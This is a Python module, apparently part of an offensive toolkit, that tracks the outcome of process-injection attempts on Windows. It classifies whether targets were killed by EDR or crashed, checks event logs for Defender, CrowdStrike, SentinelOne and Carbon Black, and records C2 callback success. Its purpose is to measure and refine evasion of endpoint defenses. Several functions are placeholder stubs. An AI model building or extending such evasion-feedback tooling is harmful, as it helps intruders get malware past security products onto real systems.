#!/usr/bin/env python3
"""
Injection Execution Feedback Loop - Phase 4 Code Injection
Monitors injection outcomes and detects EDR intervention
"""

import ctypes
import logging
import time
import subprocess
import json
from typing import Optional, Dict, List
from dataclasses import dataclass, asdict
from enum import Enum
from pathlib import Path
from datetime import datetime, timedelta

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
log = logging.getLogger("InjectionFeedback")


class InjectionOutcome(Enum):
    """Outcome of injection attempt"""
    SUCCESS = "success"                    # Successfully executed
    KILLED_IMMEDIATELY = "killed_immediate"  # Process killed within seconds
    CRASH_DETECTED = "crash"              # Process crashed/exception
    EDR_BLOCKED = "edr_blocked"           # EDR intervention detected
    HUNG_PROCESS = "hung"                 # Process unresponsive
    MEMORY_ACCESS_DENIED = "memory_denied" # WriteProcessMemory failed
    THREAD_CREATION_FAILED = "thread_fail" # CreateRemoteThread failed
    UNKNOWN = "unknown"


@dataclass
class InjectionFeedbackEvent:
    """Record of injection and subsequent monitoring"""
    injection_id: str
    target_process: str
    target_pid: int
    technique: str
    timestamp: str
    outcome: InjectionOutcome
    time_to_failure: Optional[int]  # Milliseconds before detection
    error_details: str
    c2_callback_received: bool = False
    edr_signature: Optional[str] = None  # EDR that detected it
    system_events: List[str] = None  # Security event log entries


class InjectionMonitor:
    """
    Monitor injected processes for:
    1. Process termination (killed by EDR)
    2. Memory access violations
    3. Callback success (payload executed)
    4. Thread anomalies
    5. Handle leaks/resource exhaustion
    """
    
    def __init__(self):
        self.kernel32 = ctypes.WinDLL("kernel32", use_errno=True)
        self.monitored_processes: Dict[int, Dict] = {}  # pid -> {technique, start_time, etc}
        self.feedback_events: List[InjectionFeedbackEvent] = []
    
    def start_monitoring(self, process_id: int, technique: str, injection_id: str, 
                        target_process_name: str) -> None:
        """
        Start monitoring an injected process
        
        Args:
            process_id: PID of injected process
            technique: Injection technique used
            injection_id: Unique identifier for this injection
            target_process_name: Name of target process (e.g., "explorer.exe")
        """
        self.monitored_processes[process_id] = {
            "injection_id": injection_id,
            "target_process_name": target_process_name,
            "technique": technique,
            "start_time": time.time(),
            "thread_count_initial": self._get_thread_count(process_id),
            "memory_initial": self._get_process_memory(process_id),
            "status": "monitoring",
        }
        
        log.info(f"📊 Started monitoring injected process: PID={process_id} ({target_process_name})")
    
    def check_injection_status(self, process_id: int, timeout_seconds: int = 30) -> InjectionOutcome:
        """
        Check if injected process is still alive and executing properly
        
        Args:
            process_id: PID to monitor
            timeout_seconds: How long to monitor before marking as unknown
            
        Returns:
            InjectionOutcome enumeration
        """
        if process_id not in self.monitored_processes:
            return InjectionOutcome.UNKNOWN
        
        start_check = time.time()
        
        while (time.time() - start_check) < timeout_seconds:
            # Check if process exists
            if not self._process_exists(process_id):
                elapsed = int((time.time() - self.monitored_processes[process_id]["start_time"]) * 1000)
                
                log.warning(f"⚠️  Process {process_id} terminated after {elapsed}ms")
                
                # Determine if killed by EDR or normal termination
                outcome = self._analyze_termination(process_id, elapsed)
                self._record_feedback(process_id, outcome, elapsed)
                
                return outcome
            
            # Check for crash patterns
            if self._detect_crash_pattern(process_id):
                outcome = InjectionOutcome.CRASH_DETECTED
                self._record_feedback(process_id, outcome, None)
                return outcome
            
            # Check for EDR intervention signatures
            edr_sig = self._detect_edr_intervention(process_id)
            if edr_sig:
                outcome = InjectionOutcome.EDR_BLOCKED
                self._record_feedback(process_id, outcome, None)
                return outcome
            
            # Check for hung process
            if self._detect_hung_process(process_id):
                outcome = InjectionOutcome.HUNG_PROCESS
                self._record_feedback(process_id, outcome, None)
                return outcome
            
            time.sleep(0.5)
        
        # Still alive after timeout - assume success
        log.info(f"✅ Process {process_id} still alive after {timeout_seconds}s - likely successful")
        outcome = InjectionOutcome.SUCCESS
        self._record_feedback(process_id, outcome, None)
        
        return outcome
    
    def _process_exists(self, process_id: int) -> bool:
        """Check if process with PID still exists"""
        try:
            handle = self.kernel32.OpenProcess(0x0001, False, process_id)  # PROCESS_TERMINATE
            if handle:
                self.kernel32.CloseHandle(handle)
                return True
            return False
        except:
            return False
    
    def _get_thread_count(self, process_id: int) -> int:
        """Get thread count for process"""
        try:
            result = subprocess.run(
                ["tasklist", "/FI", f"PID eq {process_id}", "/v"],
                capture_output=True,
                timeout=5
            )
            # Parse thread count from output
            return 0  # Placeholder
        except:
            return 0
    
    def _get_process_memory(self, process_id: int) -> int:
        """Get memory usage of process"""
        try:
            result = subprocess.run(
                ["tasklist", "/FI", f"PID eq {process_id}", "/v"],
                capture_output=True,
                timeout=5
            )
            # Parse memory from output
            return 0  # Placeholder
        except:
            return 0
    
    def _detect_crash_pattern(self, process_id: int) -> bool:
        """Detect if process crashed (access violation, etc)"""
        try:
            # Check for crash dump files
            result = subprocess.run(
                ["wmic", "process", "where", f"ProcessId={process_id}", "get", "ExitCode"],
                capture_output=True,
                timeout=5
            )
            
            output = result.stdout.decode('utf-8', errors='ignore')
            if "0xc0000005" in output or "0x80000003" in output:  # AV or INT3
                return True
        
        except:
            pass
        
        return False
    
    def _detect_edr_intervention(self, process_id: int) -> Optional[str]:
        """
        Detect if EDR detected and blocked the injection
        
        Signatures:
        - Process killed by security process (MsMpEng, csfalcon, etc)
        - Memory page protections changed unexpectedly
        - Thread terminated immediately after creation
        - Event log entries for suspicious process activity
        
        Returns:
            Name of detected EDR or None
        """
        
        # Check Windows Event Viewer for security events
        try:
            result = subprocess.run(
                ["wevtutil", "qe", "Security", "/q:*[System[EventID=4688]]", "/f:text"],
                capture_output=True,
                timeout=10
            )
            
            output = result.stdout.decode('utf-8', errors='ignore')
            
            # Look for EDR signatures
            edr_signatures = {
                "MsMpEng": "Windows Defender",
                "csfalcon": "CrowdStrike Falcon",
                "STOAgent": "SentinelOne",
                "CbDefense": "Carbon Black",
            }
            
            for signature, product in edr_signatures.items():
                if signature.lower() in output.lower():
                    log.warning(f"🚨 Detected {product} intervention")
                    return product
        
        except:
            pass
        
        return None
    
    def _detect_hung_process(self, process_id: int) -> bool:
        """Detect if process is hung/unresponsive"""
        try:
            result = subprocess.run(
                ["tasklist", "/FI", f"PID eq {process_id}"],
                capture_output=True,
                timeout=5
            )
            
            # Check if result contains "Not Responding"
            return "Not Responding" in result.stdout.decode('utf-8', errors='ignore')
        
        except:
            pass
        
        return False
    
    def _analyze_termination(self, process_id: int, elapsed_ms: int) -> InjectionOutcome:
        """Analyze how process was terminated"""
        
        # If killed within 1-2 seconds, likely EDR
        if elapsed_ms < 2000:
            return InjectionOutcome.KILLED_IMMEDIATELY
        
        # Check exit code
        try:
            result = subprocess.run(
                ["wmic", "process", "where", f"ProcessId={process_id}", "get", "ExitCode"],
                capture_output=True,
                timeout=5
            )
            
            output = result.stdout.decode('utf-8', errors='ignore')
            
            # Access violation
            if "0xc0000005" in output:
                return InjectionOutcome.CRASH_DETECTED
            
            # Normal exit (0 or positive small number)
            if output.strip().endswith("0"):
                return InjectionOutcome.SUCCESS
        
        except:
            pass
        
        return InjectionOutcome.UNKNOWN
    
    def _record_feedback(self, process_id: int, outcome: InjectionOutcome, 
                        elapsed_ms: Optional[int]) -> None:
        """Record injection outcome for analysis"""
        
        if process_id not in self.monitored_processes:
            return
        
        monitor_data = self.monitored_processes[process_id]
        
        event = InjectionFeedbackEvent(
            injection_id=monitor_data["injection_id"],
            target_process=monitor_data["target_process_name"],
            target_pid=process_id,
            technique=monitor_data["technique"],
            timestamp=datetime.now().isoformat(),
            outcome=outcome,
            time_to_failure=elapsed_ms,
            error_details=f"Outcome: {outcome.value}",
            c2_callback_received=False,
            edr_signature=self._detect_edr_intervention(process_id),
        )
        
        self.feedback_events.append(event)
        
        log.info(f"📋 Recorded feedback: {outcome.value}")
    
    def get_feedback_summary(self) -> Dict:
        """Get summary of injection feedback"""
        
        outcomes = {}
        for event in self.feedback_events:
            outcome = event.outcome.value
            outcomes[outcome] = outcomes.get(outcome, 0) + 1
        
        return {
            "total_injections": len(self.feedback_events),
            "successful": outcomes.get(InjectionOutcome.SUCCESS.value, 0),
            "killed": outcomes.get(InjectionOutcome.KILLED_IMMEDIATELY.value, 0),
            "crashed": outcomes.get(InjectionOutcome.CRASH_DETECTED.value, 0),
            "edr_blocked": outcomes.get(InjectionOutcome.EDR_BLOCKED.value, 0),
            "outcomes": outcomes,
            "events": [asdict(e) for e in self.feedback_events[-10:]],  # Last 10
        }
    
    def export_feedback(self, output_path: str) -> str:
        """Export feedback events to file"""
        
        export_data = {
            "timestamp": datetime.now().isoformat(),
            "total_events": len(self.feedback_events),
            "summary": self.get_feedback_summary(),
            "events": [asdict(e) for e in self.feedback_events],
        }
        
        with open(output_path, 'w') as f:
            json.dump(export_data, f, indent=2)
        
        log.info(f"💾 Exported feedback to: {output_path}")
        return output_path


if __name__ == "__main__":
    monitor = InjectionMonitor()
    print("✅ Injection Feedback Loop initialized")
